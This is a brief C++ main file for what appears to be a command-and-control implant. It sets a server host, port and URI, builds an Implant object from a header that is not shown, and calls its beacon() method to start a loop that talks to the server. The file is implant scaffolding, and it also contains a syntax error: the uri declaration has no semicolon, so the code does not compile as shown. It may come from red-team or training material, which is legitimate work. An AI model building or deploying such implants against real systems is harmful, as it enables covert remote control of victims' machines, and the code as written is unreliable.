#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include "implant.h"

#include <stdio.h>

#include <boost/system/system_error.hpp>

int main(){
    //specify address, port, and URI of server 
    const auto port = 5000 ;
    const auto host = "localhost";
    const auto uri = "/" //--> implant response
    
    // Instantiate implant obj
    Implant implant{ host, port, uri }; 
    // Call the beacon method to start loop
    try {
        implant.beacon(); //starts communicating w server
    }
    catch (const boost::system::system_error& se) {
        printf("\nerror: %s\n", se.what());
    }
}

